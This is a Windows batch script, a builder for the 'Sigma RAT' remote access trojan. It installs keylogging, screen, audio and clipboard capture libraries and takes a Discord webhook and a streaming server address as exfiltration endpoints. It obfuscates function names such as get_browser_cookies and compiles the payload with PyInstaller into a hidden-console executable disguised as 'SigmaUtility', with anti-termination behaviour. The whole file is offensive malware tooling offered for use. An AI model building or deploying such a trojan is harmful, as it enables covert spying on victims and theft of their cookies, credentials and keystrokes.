@echo off
title Sigma RAT Builder
echo Welcome to Sigma RAT Builder by WPfluxxy
echo.

REM Prompt user for their Python executable path (default to python if not specified)
set /p PYTHON_PATH="Enter the full path to your Python executable (e.g., C:\Python313\python.exe, press Enter for 'python'): "
if "%PYTHON_PATH%"=="" set PYTHON_PATH=python

REM Install required Python packages using the specified Python
echo [+] Installing required Python packages...
"%PYTHON_PATH%" -m pip install --upgrade pip
"%PYTHON_PATH%" -m pip install pyinstaller requests pillow numpy opencv-python pycryptodome pywin32 pyperclip pynput pyaudio scapy
echo [+] Package installation complete!
echo.

REM Prompt for webhook URL and streaming settings
set /p WEBHOOK="Enter your Discord Webhook URL: "
set /p SERVER_IP="Enter your streaming server IP: "
set /p SERVER_PORT="Enter your streaming server port (e.g., 9999): "
echo Building Sigma Utility with webhook: %WEBHOOK% and streaming to %SERVER_IP%:%SERVER_PORT%
echo.

REM Check if sigmarat.py exists
if not exist "sigmarat.py" (
    echo [-] Error: sigmarat.py not found in this folder!
    pause
    exit /b 1
)

REM Polymorphic obfuscation (basic: randomize function names)
echo [+] Obfuscating script...
copy sigmarat.py temp_sigmarat.py >nul
powershell -Command "(Get-Content temp_sigmarat.py) -replace 'get_system_info', 'func_%random%' | Set-Content temp_sigmarat.py"
powershell -Command "(Get-Content temp_sigmarat.py) -replace 'get_browser_cookies', 'func_%random%' | Set-Content temp_sigmarat.py"
powershell -Command "(Get-Content temp_sigmarat.py) -replace 'WEBHOOK_URL_PLACEHOLDER', '%WEBHOOK%' | Set-Content temp_sigmarat.py"
powershell -Command "(Get-Content temp_sigmarat.py) -replace 'YOUR_SERVER_IP', '%SERVER_IP%' | Set-Content temp_sigmarat.py"
powershell -Command "(Get-Content temp_sigmarat.py) -replace '9999', '%SERVER_PORT%' | Set-Content temp_sigmarat.py"

REM Build the executable with all dependencies using the specified Python
echo [+] Converting to executable...
"%PYTHON_PATH%" -m PyInstaller --onefile --noconsole --name "SigmaUtility_%random%" --distpath dist --hidden-import pycryptodome --hidden-import Cryptodome --hidden-import Cryptodome.Cipher --hidden-import Cryptodome.Util --hidden-import Cryptodome.Util.Padding --hidden-import pywin32 --hidden-import pillow --hidden-import numpy --hidden-import opencv-python --hidden-import requests --hidden-import pyperclip --hidden-import pynput --hidden-import pyaudio --hidden-import scapy temp_sigmarat.py
echo [+] Build complete! Check the 'dist' folder for SigmaUtility_[random].exe.
echo [!] Note: Run as Administrator for full anti-termination protection.

REM Clean up
echo [+] Cleaning up...
del temp_sigmarat.py
rd /s /q build
del /q temp_sigmarat.spec

echo [+] Done! Run dist\SigmaUtility_[random].exe to start.
pause